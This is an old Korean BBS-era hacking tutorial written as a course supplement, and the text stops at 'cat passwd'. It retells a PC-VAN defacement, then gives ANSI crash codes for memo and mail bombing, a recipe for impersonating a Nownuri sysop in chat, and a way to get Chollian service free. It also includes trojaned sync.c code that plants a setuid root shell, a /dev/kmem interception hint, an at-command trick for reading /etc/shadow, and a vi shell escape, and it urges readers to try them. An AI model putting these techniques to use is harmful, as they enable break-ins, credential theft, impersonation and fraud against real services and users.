안녕하세요.
강좌의 보강을 보냅니다.
아직 몇몇 자료가 남았습니다만 차차 제공해 드리기로하죠.




* pc-van 해킹사건

다음은 오래전에 있었던 pc-van의 해킹사건입니다.
모 해커가 침입해 pc-van 을 해킹해서 공지사항과 증권,몇몇 자료실의
자료를 무단으로 변경/삭제해놓고 사라졌습니다.
그런데 문제는 그게 아니라, 운영진의 대응자세였습니다.
운영진들은 그 해커를 우습게 여기면서 잡을수 있다고 공언하며
과연 운영진일지 의심스러울 공지사항을 띄웠습니다.
하지만 그후에 그 해커(크래커!)를 잡았다는 얘기는 못들었습니다.
아래 자료는 그 당시사항을 모아놓은 글인데 참조하시기 바랍니다.


                            <<   공  지  사  항   >>
       ------------------------------------------------------------------
         번호   일자                  ( 제    목 )                 조회
       ------------------------------------------------------------------
           4)   01/02   시삽의 변명 예상~                           145
           3)   01/02   증권동은 아주 뽀작!                         140
           2)   01/02   후하하 장터는 개판이다~                     144
           1)   01/02   ▶안녕하세요. 헤킹했습니다.◀fuck van▶     199

번호(공지사항 보기), ENTER(마침), Z(화면재생) : 4

                        <<  P C - V A N  공 지 사 항  >>
                                                                           1/ 1
제 목: 시삽의 변명 예상~


안녕하슈 시삽 양반...

당신또 누군가가 시삽아이디 가지고 장난한거라고 하겠지?
이양반아 해킹했다고 이렇게 떠벌이는것도 쪽팔린데 그런 모욕
까지 당하기는 싫다네 그러니 변명은 할생각 말게나...
그리고 아직도 속수 무책으로 있다니 허허 너무 느리다에..
불쌍하이..




안녕하신가들~
방금 이곳자고 다 뽀개고 다니다가 여기도 뽀작을 낼까 하다가
그냥 두고 가네... 단 크랙이나 뭐 기타등등 마니 올리고 공유
하면서 해커의 진정한 의미인 copyback을 잊지들 말게들...

그럼 이못난 선배는 먼저 가네...
.
.
.
.
.
.
.
.
.
.
Hacking of Haven...





  -----------------------------------------------------------------------------
   원하는 번호와 ENTER 키를 치세요   : 91005             상위 : P    종료 : Q
접속 중입니다. 잠시 기다려 주세요.

                            <<   공  지  사  항   >>
       ------------------------------------------------------------------
         번호   일자                  ( 제    목 )                 조회
       ------------------------------------------------------------------
         130)   01/02   참 재미있네요                               137
         127)   12/29   "머드" 시험(test)사용자를 초빙합니다        452
         126)   12/28   ● 자격정보 서비스 개시 ●                  473
         125)   12/21   ☎ InfoShop회원의 권한 & 접속방법 ☎       2773
         124)   12/21   한국통신 인포샵 1월호의 피씨밴소식...      1037
         123)   12/16   ※ Hitel 초기화면에서 91008로... ※        3163
         122)   12/16   ※ 축 91008 개통 (무료 10시간) ※          4828
         119)   12/13   증권정보를 한자리에서....                  1267
         118)   12/12   야설록-프로 무협소설 TOP-MEN에 개설!       2920
         117)   12/12   일부 써비스를 전체회원에게...              2087
         115)   12/11   ▶       증권 투자자에게 희소식       ◀   1371
         114)   12/10   유령이 되지 않는 방법                      4100

번호(공지사항 보기), ENTER(마침), Z(화면재생) : 130

                        <<  P C - V A N  공 지 사 항  >>
                                                                           1/ 4
제 목: 참 재미있네요

 저희 pcvan에도 말로만 듣던 HACKING을 당했읍니다

 증권 정보와 몇가지 공개자료실에 있던 데이터가

 없어졌읍니다

 그 헥커의 변명의글은 sysop이 돈만 알기 때문에

 자기가 판결을 내렸답니다 이런 bbs는 없어져야한다고..

 현재 역 추적중입니다 대개 윤각은 알고 있읍니다

 1월2일 오전 9시 53분에 허겁지겁 나갔읍니다

 이 9시23분이란 데이타와 우리 회원들이 알려주신

 접속시간을 한국통신에 의뢰하여 공식적인 통보를 기다리고

 있읍니다 그러나 공식적으로 자료를 받기 위해서는 형사고발이 선행되여야한답니다

 따라서 본의는 아니오나 고발수속을 밟고있읍니다

 참으로 불행한 일입니다  또 놀라운것은 저희pcvan의

 핵커동호회원들의 분노입니다 감이 우리동호회가 있는곳에

 들어와서 핵킹을 하다니...이런 뜻으로 대단히 분노하면서

 그 핵커를 잡 요령과 미리 깔아놓았던 그물에 대한

 좋은 충고를 해 주셨읍니다 핵킹을 방지하기위한 그물을

 아시겠지요? 좋은 충고 감사합니다 이 사건이 끝난후에

 공개적으로 그 회원을 밝혀드리겠읍니다

 현재까지 밝혀진것은 자세히 밝힐수 없으나 접속했던 전화번호와

 접속자의 본명 그 접속자의 학교명과 몇 학년인지..

 본인이 다른사람에게 책임을 전가할 우려때문에 접속되였던

 전화번호를 공식적으로 요청하였읍니다 접속시초 시간과

 접속종료시간, 그리고 헥킹전에 비밀방을 만들고 이야기한 자료

 등은 모두 확보하였읍니다

 접속자의 본명 그 접속자의 학교명과 몇 학년인지..

 본인이 다른사람에게 책임을 전가할 우려때문에 접속되였던

 전화번호를 공식적으로 요청하였읍니다 접속시초 시간과

 접속종료시간, 그리고 헥킹전에 비밀방을 만들고 이야기한 자료

 등은 모두 확보하였읍니다

 시간 문제이긴해도 추적은 다된것이나 다름없읍니다

 참 재미있네요 않그런가요?

다음(F) 앞(B) 다음항목(N) 앞항목(A) 상위면(P) 연속보기(PR) Z(화면재생) X(종료)
>>
끝





* 이야기로 하는 해킹

안시를 이용하여 우린 여러가지를 할 수 있습니다.

code.txt는 메일폭탄의 코드입니다.

다음코드가 이야기에서 다운명령을 하게 하는 코드죠.
이런식으로 다른것을 포함시키면 됩니다.

rz**B00000000000000?


이러한 것을 메모 폭탄으로도 사용할 수 있습니다.
아래의 코드를 삽입하여 메일이나 메모를 보낸다면 상대방의
컴퓨터는 갑자기 다운 화면을 보여줄것입니다.
이것은 단지 맛뵈기에 불과하지만 여러분은 이것을 응용하여
갖가지 다른 방법으로 고칠수 있습니다.
이런 메모 100여개만 보내면 아마 아이디 해제하는게 날걸요~
저한테 보내지는 마세요. 흐흐흐~~
참, 이러한 안시를 이용한 방법은 이야기 스크립트와 결합시킬경우
커다란 힘을 발휠 할 수 있습니다.
이야기 스크립트를 이용해 자동으로 메모나 메일을 보낼수 있게 할수
있으니까요.
이방법을 통해 특정인에게 수백,수천통의 메일을 보내는것입니다.
다음은 이야기에서 사용하는 스크립트의 헤더파일 내용입니다.
다음의 명령어들을 이용해서 우린 간단한 프로그래밍을 할 수
있는것입니다.
기본적인 명령들을 이용하여 만든 "삐삐해킹"프로그램의 소스(pager.scs)가
포함되어 있으니 한번 활용해 보시는것도 좋겠습니다.
하지만 현재 이 방법은 삐삐회사가 막아놓아서 안통합니다.
단지 이런게 있고 이야기 스크립트로 프로그래밍을 어떻게 하는지
알아두시기 바랍니다.
이야기 스크립트는 잘만 활용하면 정말 엄청난 힘을 발휘할수 있습니다.

-------------------------------------------------------------------------

//  값 정의
#정의   잘못            0
#정의   정상            1
#정의   제대로          1

//  통신 포트
#정의   _COM1           0
#정의   _COM2           1
#정의   _COM3           2
#정의   _COM4           3

#정의   _com1           _COM1
#정의   _com2           _COM2
#정의   _com3           _COM3
#정의   _com4           _COM4
#정의   _1              _COM1
#정의   _2              _COM2
#정의   _3              _COM3
#정의   _4              _COM4


//  패리티 비트
#정의   _EVEN           0
#정의   _ODD            1
#정의   _NONE           2
#정의   _none           _NONE
#정의   _odd            _ODD
#정의   _even           _EVEN
#정의   _N              _NONE
#정의   _O              _ODD
#정의   _E              _EVEN
#정의   _n              _NONE
#정의   _o              _ODD
#정의   _e              _EVEN


//  단말기 종류
#정의   _TTY            0
#정의   _VT100          1
#정의   _VT200          2
#정의   _FS220b         3
#정의   _ANSI           4
#정의   _이야기FS       5
#정의   _이야기VT       6

#정의   _tty            _TTY
#정의   _vt100          _VT100
#정의   _vt200          _VT200
#정의   _FS220B         _FS220b
#정의   _FS220          _FS220b
#정의   _fs220          _FS220b
#정의   _ansi           _ANSI
#정의   _이FS           _이야기FS
#정의   _이VT           _이야기VT


//  사용 한글
#정의   _상용조합형     1
#정의   _삼성조합형     2
#정의   _금성조합형     3
#정의   _옛KS조합형     4
#정의   _도깨비조합형   5
#정의   _7비트완성형    6
#정의   _KS5601완성형   7
#정의   _영문전용       8

#정의   _상용           _상용조합형
#정의   _상용조         _상용조합형
#정의   _삼성           _삼성조합형
#정의   _삼성조         _삼성조합형
#정의   _금성           _금성조합형
#정의   _금성조         _금성조합형
#정의   _옛KS           _옛KS조합형
#정의   _옛KS조         _옛KS조합형
#정의   _옛ks           _옛KS조합형
#정의   _옛ks조         _옛KS조합형
#정의   _옛케이에스     _옛KS조합형
#정의   _도깨비         _도깨비조합형
#정의   _7비트          _7비트완성형
#정의   _KS             _KS5601완성형
#정의   _KS완           _KS5601완성형
#정의   _ks             _KS5601완성형
#정의   _ks완           _KS5601완성형
#정의   _영문           _영문전용
#정의   _영문전         _영문전용


//  색깔값
#정의   _검정색           0
#정의   _파랑색           1
#정의   _녹색             2
#정의   _하늘색           3
#정의   _빨강색           4
#정의   _보라색           5
#정의   _갈색             6
#정의   _밝은회색         7
#정의   _회색             8
#정의   _밝은파랑         9
#정의   _연두색          10
#정의   _밝은하늘        11
#정의   _밝은빨강        12
#정의   _밝은보라        13
#정의   _노랑색          14
#정의   _흰색            15


//  전송 속도
#정의      _110         0
#정의      _150         1
#정의      _300         2
#정의      _600         3
#정의     _1200         4
#정의     _2400         5
#정의     _4800         6
#정의     _9600         7
#정의    _14400         8
#정의    _19200         9
#정의    _38400        10
#정의    _57600        11
#정의   _115200        12


#정의   보내기          asyncputs
#정의   난수구하기      random

//  기본 함수들의 형식
정수    글마중( 글월 기다릴글월 );
정수    제한글마중( 글월 기다릴글월, 정수 시간 );
정수    글마중제한시간( 정수 제한시간 );
        찾을글( 글월 찾을글월 );
정수    화면잡기( 글월 파일이름 );
정수    코드갈무리( 글월 파일이름 );
정수    화면갈무리( 글월 파일이름 );
정수    갈무리끝( );
정수    찍기시작( );
        찍기마침( );
정수    파일보내기( 글월 파일이름 );
정수    편지보내기( 글월 파일이름 );
정수    그냥보내기( 글월 파일이름 );
정수    파일받기( );
        거는방법( 정수 방법 );
정수    전화걸기( 글월 전화번호 );
정수    전화끊기( );
        메뉴파일( 글월 파일이름 );
        단말기방식( 정수 단말기 );
        통신포트( 정수 포트 );
        전송속도( 정수 속도 );
        패리티비트( 정수 비트 );
        데이터비트( 정수 비트 );
        정지비트( 정수 비트 );
        사용한글( 정수 한글 );
정수    글쇠읽기( 글월 보낼글월 );
        정수보내기( 정수 보낼정수 );
        찾은글정리( );
정수    찾은글번호( );
        중지( );

// 파일 관련
정수    파일열기(글월 파일이름, 글월 속성);
        파일닫기( 정수 파일번호 );
정수    파일읽기(글월 버퍼, 정수 길이, 정수 파일번호);
정수    파일쓰기(글월 버퍼, 정수 길이, 정수 파일번호);
정수    파일글월쓰기(글월 버퍼, 정수 파일번호);
글월    파일글월읽기(글월 버퍼, 정수 갯수, 정수 파일번호);
정수    파일한자쓰기(정수 글자, 정수 파일번호 );
정수    파일한자읽기(정수 파일번호);
정수    파일위치(정수 파일번호, 정수 위치위쪽, 정수 위치아래쪽, 정수 위치방법);
        파일감기(정수 파일번호);
정수    파일위치위쪽(정수 파일번호);
정수    파일위치아래쪽(정수 파일번호);
정수    디스크바꿈(정수 디스크번호);
정수    디스크알기();
정수    현재목록(정수 드라이브번호, 글월 목록이름);
정수    목록바꾸기( 글월 바꿀목록 );
정수    목록만들기(글월 목록이름);
정수    목록지우기(글월 목록이름);
정수    이름바꾸기(글월 옛이름, 글월 새이름);
정수    파일지우기(글월 파일이름);

/////////////////////////
// 입출력 관련
정수    글쇠눌림();
정수    글자받기();
정수    글자받기보임();
        글자쓰기(정수 글자한자);
정수    글자받기2();
정수    글월쓰기(글월 버퍼);
정수    글월받기( 정수 가로위치, 정수 세로위치, 글월 버퍼, 정수 최대값 );
정수    창문글월받기( 정수 가로위치, 정수 세로위치, 글월 보일글월, 글월 버퍼, 정수 최대값 );
        지연( 정수 지연시간 );
정수    글쇠지연( 정수 지연시간 );
        알림( 글월 보일글월 );
        지연알림( 글월 보일글월, 정수 지연시간 );
        메모리글자쓰기(정수 세그먼트, 정수 오프셋, 정수 넣을값);
정수    메모리글자읽기(정수 세그먼트, 정수 오프셋);
정수    포트읽기(정수 포트번호);
        포트쓰기(정수 포트번호, 정수 값);
        인터럽트불가();
        인터럽트가능();
        소리( 정수 주파수 );
        소리끄기();
        연주하기( 글월 연주글월 );

// 화면 관련
        화면지우기();
        위치이동( 정수 가로위치, 정수 세로위치 );
정수    가로위치();
정수    세로위치();
정수    가로크기();
정수    세로크기();
정수    색깔알기( 정수 색위치 );
정수    색깔바꾸기( 정수 전경색, 정수 배경색 );

// 글월 관련
글월    memchr( 글월 문장, 정수 글자, 정수 갯수 );
정수    memcmp( 글월 문장1, 글월 문장2, 정수 갯수);
정수    memcpy( 글월 어디로, 글월 어디에서, 정수 갯수);
정수    memmove( 글월 어디로, 글월 어디에서, 정수 갯수);
정수    memset(글월 문장, 정수 글자, 정수 갯수);
        setmem(글월 어디로, 정수 갯수, 정수 글자);
글월    strcat( 글월 원래문장, 글월 붙일문장 );
글월    strncat( 글월 원래문장, 글월 붙일문장, 정수 갯수 );
글월    strcpy( 글월 어디로, 글월 어디에서 );
글월    strncpy( 글월 어디로, 글월 어디에서, 정수 갯수 );
글월    strchr( 글월 문장, 정수 글자);
글월    strrchr(글월 문장, 정수 글자);
정수    strcmp(글월 문장1, 글월 문장2);
정수    strncmp( 글월 문장1, 글월 문장2, 정수 갯수 );
정수    strlen(글월 문장);
글월    strstr(글월 문장1, 글월 문장2);
글월    strpbrk(글월 문장1, 글월 문장2);
글월    strtok(글월 문장1, 글월 문장2);

// 기타 필요한 함수
정수    atoi( 글월 문장 );
글월    itoa( 정수 숫자, 글월 문장, 정수 자리수 );
정수    tolower( 정수 글자 );
정수    toupper( 정수 글자 );
정수    isalnum( 정수 글자 );
정수    islower( 정수 글자 );
정수    isalpha( 정수 글자 );
정수    isprint( 정수 글자 );
정수    isascii( 정수 글자 );
정수    ispunct( 정수 글자 );
정수    iscntrl( 정수 글자 );
정수    isspace( 정수 글자 );
정수    isdigit( 정수 글자 );
정수    isupper( 정수 글자 );
정수    isgraph( 정수 글자 );
정수    isxdigit( 정수 글자 );
정수    random( 정수 범위 );
        randomize();
        srand(정수 seed);
정수    절대값( 정수 숫자 );
정수    최소값( 정수 숫자1, 정수 숫자2 );
정수    최대값( 정수 숫자1, 정수 숫자2 );
정수    검사하기( 글월 문장 );
정수    알림검사하기( 정수 가로위치, 정수 세로위치, 글월 알림글, 글월 예, 글월 아니오 );
        중지알리기( 글월 알림글 );
        글쇠알리기( 글월 알림글 );
글월    파일고르기( 글월 파일이름, 글월 알림글 );
        파일보기( 글월 파일이름 );
        메뉴색깔( 정수 글자색, 정수 배경색 );
정수    메뉴고르기( 정수 가로위치, 정수 세로위치, 정수 가로글자갯수, 정수 세로메뉴갯수, 글월 머릿말, 글월 메뉴이름들 );
정수    선택하기( 정수 가로위치, 정수 세로위치, 정수 길이, 정수 갯수, 정수 시작위치 );
정수    파일이름분리( 글월 원래문장, 글월 드라이브, 글월 목록, 글월 파일이름, 글월 확장자);
정수    도스명령(글월 명령어);
정수    파일확인(글월 파일이름, 정수 확인종류);
글월    시간알기();
글월    날짜알기();

////////////////////////////
// 통신 관련
정수    asyncget();
정수    asyncput( 정수 값 );
정수    asyncgetch();
        asyncputs(글월 str);
정수    carrier();

///////////////////////////
// 시스템 관련
        한글종류바꿈( 정수 어디에서, 정수 어디로 );
        한글바꿈( 글월 한글 );
정수    글월바꿈( 글월 문장 );
정수    intget( 글월 문장, 정수 갯수 );
글월    intput( 글월 문장, 정수 갯수, 정수 값 );
글월    strput( 글월 문장1, 글월 문장2, 정수 갯수 );
글월    strgetstr( 글월 문장, 정수 갯수 );

////////////////////////////
// 그림 관련
        pie( 정수 가로위치, 정수 세로위치, 정수 반지름, 정수 시작각, 정수 끝각, 정수 색깔 );
        arc( 정수 가로위치, 정수 세로위치, 정수 시작각, 정수 끝각, 정수 반지름 );
        arcfill( 정수 가로위치, 정수 세로위치, 정수 시작각, 정수 끝각, 정수 반지름 );
        putpixel( 정수 가로위치, 정수 세로위치 );
        putpixelpattern( 정수 가로위치, 정수 세로위치 );
정수    getpixel( 정수 가로위치, 정수 세로위치 );
        setpattern(정수 mode,정수 PsizeX,정수 PsizeY, 글월 Pattern);
        line( 정수 가로위치1, 정수 세로위치1, 정수 가로위치2, 정수 세로위치2 );
        lineto( 정수 가로위치, 정수 세로위치 );
        moveto( 정수 가로위치, 정수 세로위치 );
        hline( 정수 가로위치,정수 세로위치,정수 길이 );
        xorline( 정수 가로위치1,정수 세로위치1,정수 가로위치2,정수 세로위치2 );
        xorblock( 정수 가로위치, 정수 세로위치 , 정수 가로넓이 ,정수 세로넓이 );
        circle( 정수 가로위치, 정수 세로위치, 정수 반지름 );
        box( 정수 가로위치1, 정수 세로위치1, 정수 가로위치2, 정수 세로위치2 );
        boxfill( 정수 가로위치1, 정수 세로위치1, 정수 가로위치2, 정수 세로위치2 );
        xorbox( 정수 가로위치1, 정수 세로위치1, 정수 가로위치2, 정수 세로위치2 );
        clearblock( 정수 가로위치, 정수 세로위치, 정수 가로넓이, 정수 세로넓이 );
-------------------------------------------------------------------------------------


다음은 나우누리에서 시삽4를 사칭하는 안시입니다.
아래대로 행하면 대화방에서 누가봐도 sysop4(나우지기)로 보입니다.
겜방을 초토화해보세요!

☞는  글쇠정의 (Alt_M) 에서 ┛는 Ctrl+B+[ 입니다.
우선 Alt_C(채팅모드에서)

*** sysop4(나우지기)님이 들러 오셨습니다!! ☞ 똑같이 (들어오는는 경우)
*** sysop4(나우지기)님이 나가셨습니다.  ☞ 똑같이  (나가는 경우)

/al $#133$#141┛┛┛┛
☞ /al $#133$#141$e$e$e$e
┌────────────────────┐
│                                        │
├────────────────────┼
│sysop4(나우지기)    _                   │
└────────────────────┘

그러나 일부 사람들은 /st 를 해보는 경우도 있으니 이를 대비하기위해
"/al 자기이름"을 써넣어야 합니다.

추가로 다음것은 다운안시  "/al ┛[99999M"  입니다.
컴퓨터를 다운시키는 안시죠. 테스트 해보시길...
그리고 다운안시 피하는 법은 터미널 TTY를 사용하면 됩니다.

그리고 기업체,교육,전화국 등 공공 ID 의 경우는 비밀번호로 전화번호가
대부분 쓰입니다. 하이텔등에서 주로 자행되는 쉬운 비밀번호들은
아이디도용의 표적이되죠.

다음은 천리안을 무료로 이용할수있는 비결입니다.
1. 01420 으로 접속을 합니다.
2. 12번 "농림수산 정보" 에 접속을 합니다.
3. GUEST로 들어가 100번에서 가입을 합니다.
4. 가입하고 3~4일 지나면 확인 전화를 한후 실제 접속합니다.
5. TOP 에서 99번을 쳐세요
6. 거기서 "1. 천리안 서비스 연결" 이런 메뉴에 접속을 시도합니다.
단, 이 방법은 농림수산 정보라는 공유 아이디로 들어 갔기 때문에
    메일을 보낸다거나 게시물을 쓴다거나 하는 것들은 불가능합니다.
    즉, 쓰기 기능은 불가능 합니다.
    끝으로 주의사항으로 장수비결을 알려드리자면,
    천리안 사용시간이 농림수산 정보의 사용시간의 95% 이상을 차지하면
    안 된다는 것입니다.
    즉,농림수산 정보에 가입해서 매일 천리안만 한다면 2달동안 천리안 사용
    기능을 박탈당하니 농림수산 정보에서도 활동 하여야합니다.
아차, 01410으로 접속해도 농림수산 정보가 나옵니다.
그리로도 해보세요.











* 백도어와 개구멍
백도어를 아십니까? 일명 뒷문이라고 하죠.
해커가 침투(?)해서 자신이 원하는 작업을 한후 차후에 또 접속하기위해
백도어를 설치하는 것입니다.
즉, 백도어란 ROOT의 관리자 모르게 자신에게 ROOT권한을 부여한
퍼미션을 열어두는 것이죠.

아래 설명하는것은 초보적인 것들이기에 웬만한 보안툴에는 다 잡히지만
게으른 관리자도 많으니 한번 해보시길...

예를 들어봅시다.

(1) 기초적인 것으로  /dev 디렉토리에 suid된 shell을 숨겨둡니다.
    /dev에는 많은 파일이 들어 있으므로 섣불리 ls해 보지는 않는다는
    인간적인 약점을 이용하는 것입니다.
(2) login을 다시 컴파일합니다.
    소스인 "login.c"에 특정 패스워드를 집어넣어 자신이 이것을 입력했을경우
    로그인이 되도록 하는것입니다.
    하지만 이것은 리눅스같이 소스가 공개되어 있는것은 가능하지만 SUN같은
    것은 좀 힘듭니다. 하지만 SUN도 소스가 어딘가에 있으니 불가능하지는
    않을듯...
(3) sync를 컴파일합니다.
#cat >sync.c
main()
{
    if (get_uid() == 0) {
        system("cp /bin/sh /tmp/.rootsh");
        system("chmod u+s /tmp/.rootsh");
    }
    sync();
}
^D
#cc -o sync sync.c
#cp sync /bin/sync
    이렇게 해 두면 루트가(또는 일정시간마다) sync가 수행될때마다
    /tmp에 .rootsh이 생성된다. 혹시 root가 알고 지웠을 경우라도
    sync가 바뀌었다는것을 모른다면 sync가 수행될때마다 계속 생길 것입니다.
(4) /dev/kmem을 읽기 가능한 상태로 만들어 둡니다.
    '/dev/kmem'이 읽기 가능하다면, 당신은 짧은 C프로그램을 사용하여
    다른 터미널의 입출력을 가로챌 수 있고 따라서 로그인 네임과 비번등
    모든것을 가로챌 수 있기때문이죠.
    '/dev/kmem'이 쓰기 가능이라면, user structure를 편집하여 당신의
    uid를 바꿀수 있습니다.


백도어 말구 개구멍이란게 있습니다.
개구멍이란 예를들어 천리안,하이텔 같은 서비스에서 인터넷으로
오고 갈수 있는지 등입니다.
이를 인바운딩 혹은 아웃바운딩 이라고 말합니다.
인바운딩이랑 인터넷에서 서비스사로 들어올수 있는 기능이고 아웃바운딩은
그 반대로 나갈수 있게 하는 것입니다.
현재 유료화된 인터넷 계정 서비스등을 사용한다면 모를까 그전에는
인바운딩 서비스 같은 것을 하는줄도 몰랐고 할수있다고 해도 접속도메인을
알수없게 했습니다.
개구멍이란 바로 그러한 접속 도메인을 일컿는것입니다.
다음과 같은것이 그러한 것입니다.

hitel.goldstar.co.kr
202.30.93.19
134.75.141.101
134.75.100.120


* 최근에 주목받고있는 대표적인 해킹방법
  다음은 어느곳에선가 기사화된 자료를 바탕으로 재구성한 것입니다.
  기본적인 상식이니 꼭! 알아두세요.
  다음에는 이것들에 대한 실제적인 사용법에 대해 더 자세히 다루죠.

  * IP Spoofing
  인터넷 프로토콜인 TCP/IP의 구조적 결함, 즉 TCP 시퀀스번호, 소스
라우팅, 소스 주소를 이용한 인증(Authentication) 메커니즘 등을 이용한
방법으로써 인증(Authentication) 기능을 가지고 있는 시스팀을 침입하기
위해 침입자가 사용하는 시스팀을 원 호스트로 위장하는 방법이다.
즉, 자신의 컴퓨터를 상대방의 컴퓨터인것처럼 가장하는 방법인데
상대의 보안 시스템은 나의 침입을 알지못하고 나를 자신으로 아는것이다.
이방법은  NASA 에 침투할 대표적인 방법이다.

  # Packet Sniffering 방법
  현재 가장 많이 쓰이고 있는 방법으로 tcpdump, snoop, sniffer 등과
같은 네트워크 모니터링 툴을 이용해 네트워크 내에 돌아다니는 패킷의
내용을 분석해 정보를 알아내는 것이다.
스니퍼같은 프로그램을 이용하여 네트워크에서 돌아다니는 패킷들을
이용하는 일종의 도청이라 보겠다.
  해커는 먼저 자신의 시스팀이나 보안 취약점을 가지고 있는 시스팀을
침입하여 루트 권한을 획득한다.  그후 이 시스팀에 다시 로그인하기
위해 트로이목마 풀그림 혹은 백도어를 설치한 후 그 시스팀이 속해 있는
네트워크 상의 모든 ftp, 텔넷 그리고 rlogin 세션의 처음 128개의 문자를
가로챌 수 있는 네트워크 모니터링 툴을 설치해 실행한다.
  일반적으로 처음 128문자내에는 시스팀명, 사용자명, 패스워드에 대한
정보가 포함되어 있어서 이 정보를 이용하면 아무런 어려움 없이
네트워크 내 모든 호스트에 접속할 수 있다.
참고로 이러한 문자들의 조합으로 만들어낼 수 있는 가짓수는 무려 20조개에
달한다.

  # OS 설치 방금 끝낸 호스트 침입
  인터넷에서 중요한 게이트웨이나 서비스 호스트들은 성격상 OS를
업그레이드 하거나 새로운 OS를 설치하는 경우에 사용자들이 이용하지
못하므로 대부분 언제 새로운 OS를 설치한다는 것을 네트워크를 통해서
공지하게 된다.  하지만 OS 설치를 막 끝낸 호스트는 루트의 패스워드가
없거나 보안 검사(Security Check) 기능이 거의 작동되지 않는
상황이므로 누구나 쉽게 침투할 수 있다.
물론 이방법은 가장 쉽게 생각할 수 있는것이지만 어느 사이트가 새로
OS를 바꾸었는지 알기어렵다.
하지만 자주 들르는 곳이라면 그 변화를 알수 있으니 주목해보기를...

  # Sendmail 버그
  Sendmail은 네트워크 간에 메일을 전송해 주기 위해 만들어진
메일전송 풀그림이다.  이 풀그림은 TCP/IP, UUCP, 빗넷 등 다른
네트워크 간의 전송도 가능하게 하므로 거의 모든 유닉스 기종에서
사용되고 있다.  따라서 Security Hole이 발견되면 그 여파가 어떤
것보다 크다.  대부분 자사 유닉스에 버전 5의 이 풀그림을 함께
배포하는데, 많은 버그를 가지고 있는 것으로 알려지고 있다.  88년에
인터넷에 연결돼 있던 7천 5백대의 시스템이 정지했던 인터넷 웜(Internet
Worm) 사건 때에는 'debug'라는 버그로 명성을 떨쳤다.
이 인터넷웜 사건은 지금까지도 떠들썩하게 전해 내려오는 대표적 사건이다.
현재에도 AT명령을 이용한 SENDMAIL버그가 유용하게 쓰이고있다.


  # 상업 통신망 해킹
  하이텔, 천리안, 나우콤 등 통신망은 인터넷과 연결되기 이전에는
자체적으로 내부의 네트워크를 사용하고 있었다.  그런데 실제 서비스
이용자들은 유닉스 위에서 작동되고 있는 메인 프로그램에서 빠져 나오는
경우가 거의 없었으므로 서비스를 하고 있는 유닉스 호스트와 네트워크는
허술하게 세팅돼 있다.  하지만 인터넷과 연동한 요즘은 과거에는 없었던
허점들이 인터넷 해커들의 좋은 목표가 되고 있다.  나우콤과 천리안의
경우 방화벽(Firewall)을 설치해 운영하고 있으나, 느슨하게 구성되어
있어서 역시 허점을 많이 나타내고 있다.  방화벽은 사실 여러
네트워크와 연동하고 있는 기관에선 좋은 대안이 아닐 수도 있다.
사실 국내 통신망들에서 제공하는 인터넷 서비스의 초기때만해도 한창
이러한 문제로 극성이었다.
방화벽을 설치한다 하더라도 이것이 만능은 아니기 때문이다.

  # 인터넷 상업망 서비스
  아이네트나 코넷 같은 인터넷 서비스 공급업체나 이 업체에 연동해서
인터넷 서비스를 받는 기관 역시 많은 문제점을 안고 있다.  망서비스를
하는 회사는 각 서비스마다 전담하는 인원을 두게 마련인데, 이런 경우
한 호스트에서 시스팀을 총체적으로 관리할 수 없어서 여러 가지
잠재적인 문제점을 안게 된다.
아이네트등이 주로 해커들의 표적이된다.
아이네트에서 빼내어진 패스워드화일은 "파워해킹테크닉"에도 소개되었을
정도로 허술했었다.
더우기 요즘은 그 패스워드 화일을 매매하는 경우도 있으니...

  # Firewalls의 해킹
  방화벽(Firewall)은 업체나 기관에서 인터넷에 연동할 때 외부에서
시도되는 해킹을 막기 위해서 게이트웨이 정도에서 연결을 막아 버리는
방법으로 개발되었다.  따라서 큰 기관에서 각 호스트 보안을 걱정하지
않아도 되는 장점이 있다.  하지만 Firewall 안에 속해 있는 호스트들은
대부분 허술하게 관리되고 있어 일단 Firewall만 뚫리고 나면 그 기관
전체가 다 무너지는 단점이 있다.
대형통신망 서비스회사 자체내부나 그와 연결된 기관에서 직접 해킹을
시도한다면 방화벽이 무색해진다.
실제로 그러한 회사 내부에서 아르바이트 하는 학생들이 간혹 그런일을
저지르기도 하니...

여담이지만 실제로 제가 일하고(?)있는 모 대형 통신서비스 회사를 보면
정말 너무 허술하게 관리되고 있더군요.
우린(?) 직원들이 퇴근한 밤에 주로 그 컴을 사용해 작업을 하고
연구소와 물려있는 호스트에 결과를 쌓아두고,테스트 하는데
우린 이미 방화벽안에 들어 있는 셈이지요.
센터직원들의 경우 중요한 문서등을 그대로 방치한채 관리하더군요.
우리끼리 하는말이있죠. 이것들을 다 갖고 나르면 새로운 대형
통신회사 생기겠구나 하구...
하지만 이경우는 일부 특수한 경우이고 보통 외부에서 접속해야 하는데
쫌 힘들죠. 하지만 뜻이 있는곳에 길이있다고 했으니 너무 걱정 마세요.






* AT명령을 이용한 패스워드 쉐도우 가져오기
AT 명령은 누차 얘기했지만 상당히 쓸모있는 명령입니다.
이를 이용해서 패스워드 화일(쉐도우)을 가져와보기로 하죠.
at명령은 지정된 시간에 어떤 명령을 수행할 수 있게 해주는 명령입니다.
이 at명령으로 퍼미션이 막힌 화일도 읽을 수가 있는게 강점이죠.
요즘은 이 버그가 막힌곳이 많지만 아직도 통하는 곳이 있으니 문제죠.
먼저 date 명령으로 시간을 확인한후 현재 시간이 15:30분이면
시간을 넉넉히 두고
at -f /etc/shadow 1540
이렇게 명령을 주면 됩니다. 뒤에 숫자는 시간이겠죠.
이렇게 해서 다음 디렉토리에 가서 화일을 봅니다.
/var/spool/cron/atjobs
아까 나온 숫자를 이름으로 하는 화일이 하나 있습니다.
단, 이 화일은 15:40분이 지나면 사라지니 그전에 보셔야 할겁니다.
물론 일정부분의 편집은 거쳐야합니다.
이제 여러분은 쉐도우를 얻을 수 있는 것입니다.
이것을 막기위해서는 권한을 상당히 막아놓아야합니다.
물론 관리자 측면에서죠. AT명령을 아에 안통하게~~
그리고 참고로 한마디 더 하자면,
예전에 VI 에서 쉘로 빠지는 방법이 있었습니다.
아~당연히 가는 그런거말고 나우누리에서 빠지는 그런거 말입니다.
일전에 나우가 해킹당했을때 이방법을 쓴거라는 소문이 자자했었거든요.
이제는 안돼지만요.
:w! !/bin/sh < /dev/ttyS0 뭐 이런식으로 들어 갔다고 하던데
요즘은 감시 프로그램이 계속 백그라운드로 돌아가서리
단번에 걸릴겁니다.



* 패스워드와 크랙잭
유닉스에서 패스워드는 반드시 암호화를 거칩니다.
이렇세 암호화된 패스워드는 /etc 디렉토리에 저장이됩니다.
여러분이 대학등에 계정을 가지고 있다면
$ cd /etc 를 하면 패스워드가 들어있는 디렉토리에 접근이 가능합니다.
그곳에서
$ cat passwd
하시면
